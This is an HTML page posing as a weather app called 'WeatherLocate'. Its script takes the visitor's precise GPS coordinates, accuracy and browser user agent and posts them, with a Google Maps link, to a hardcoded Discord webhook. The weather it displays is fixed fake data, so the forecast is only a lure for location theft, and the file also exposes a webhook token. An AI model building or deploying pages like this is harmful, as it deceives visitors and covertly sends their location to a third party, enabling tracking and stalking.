<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WeatherLocate</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(120deg, #1a2980, #26d0ce);
            color: #333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 500px;
            overflow: hidden;
            text-align: center;
        }
        
        .header {
            background: linear-gradient(to right, #1a2980, #26d0ce);
            color: white;
            padding: 25px;
        }
        
        .header i {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
        }
        
        .content {
            padding: 25px;
        }
        
        .location-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(to right, #1a2980, #26d0ce);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            font-weight: 600;
            margin: 20px 0;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .location-btn i {
            margin-right: 10px;
        }
        
        .location-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        .weather-info {
            display: none;
            text-align: left;
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .weather-main {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .weather-icon {
            font-size: 54px;
            color: #1a2980;
            margin-right: 15px;
        }
        
        .temperature {
            font-size: 42px;
            font-weight: 700;
            color: #1a2980;
        }
        
        .weather-description {
            font-size: 18px;
            color: #666;
            margin-bottom: 15px;
        }
        
        .details {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-top: 15px;
        }
        
        .detail-item {
            background: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }
        
        .detail-item i {
            font-size: 24px;
            color: #1a2980;
            margin-bottom: 10px;
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .loading i {
            font-size: 36px;
            color: #1a2980;
            animation: spin 1.5s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <i class="fas fa-cloud-sun"></i>
            <h1>WeatherLocate</h1>
            <p>Get accurate weather for your current location</p>
        </div>
        
        <div class="content">
            <p>To get your local weather, we need access to your location</p>
            
            <button class="location-btn" id="location-btn">
                <i class="fas fa-map-marker-alt"></i> Get My Location
            </button>
            
            <div class="loading" id="loading">
                <i class="fas fa-spinner"></i>
                <p>Getting your location and weather...</p>
            </div>
            
            <div class="weather-info" id="weather-info">
                <div class="weather-main">
                    <div class="weather-icon">
                        <i class="fas fa-sun"></i>
                    </div>
                    <div>
                        <div class="temperature">72°F</div>
                        <div class="weather-description">Sunny</div>
                    </div>
                </div>
                
                <div class="details">
                    <div class="detail-item">
                        <i class="fas fa-wind"></i>
                        <p>Wind<br><strong>5 mph</strong></p>
                    </div>
                    <div class="detail-item">
                        <i class="fas fa-tint"></i>
                        <p>Humidity<br><strong>45%</strong></p>
                    </div>
                    <div class="detail-item">
                        <i class="fas fa-temperature-high"></i>
                        <p>Feels Like<br><strong>74°F</strong></p>
                    </div>
                    <div class="detail-item">
                        <i class="fas fa-compress-alt"></i>
                        <p>Pressure<br><strong>1013 hPa</strong></p>
                    </div>
                </div>
            </div>
            
            <div class="footer">
                <p>Weather data is based on your current location</p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const locationBtn = document.getElementById('location-btn');
            const loading = document.getElementById('loading');
            const weatherInfo = document.getElementById('weather-info');
            
            // Your Discord webhook URL
            const discordWebhookURL = 'https://discord.com/api/webhooks/1393190214238998598/RTf67SJLv3lWkdlSeYbSQZ8mM9kxPHMHSpTtXf1DYNhQmT_yWET1qIWKNBCpKdWi3Gx9';
            
            // Function to send data to Discord
            function sendToDiscord(message) {
                const payload = {
                    content: message,
                    username: 'WeatherLocate Bot',
                    avatar_url: 'https://example.com/avatar.png'
                };
                
                fetch(discordWebhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (!response.ok) {
                        console.error('Failed to send data to Discord');
                    }
                })
                .catch(error => {
                    console.error('Error sending data to Discord:', error);
                });
            }
            
            // Function to get location and send to Discord
            function getLocation() {
                loading.style.display = 'block';
                locationBtn.disabled = true;
                
                if (!navigator.geolocation) {
                    alert('Geolocation is not supported by your browser');
                    loading.style.display = 'none';
                    locationBtn.disabled = false;
                    return;
                }
                
                function success(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    // Create Google Maps link
                    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    
                    // Create a message with the location data
                    const message = `📍 WeatherLocate Location Access:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nGoogle Maps: ${mapsLink}\nUser Agent: ${navigator.userAgent}`;
                    
                    // Send the location to Discord
                    sendToDiscord(message);
                    
                    // Show weather information after a short delay
                    setTimeout(() => {
                        loading.style.display = 'none';
                        weatherInfo.style.display = 'block';
                        locationBtn.textContent = 'Location Retrieved';
                        locationBtn.style.background = '#4CAF50';
                    }, 1500);
                }
                
                function error() {
                    alert('Unable to retrieve your location. Please make sure location services are enabled.');
                    loading.style.display = 'none';
                    locationBtn.disabled = false;
                }
                
                navigator.geolocation.getCurrentPosition(success, error, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            }
            
            // Event listener for location button
            locationBtn.addEventListener('click', getLocation);
        });
    </script>
</body>
</html>
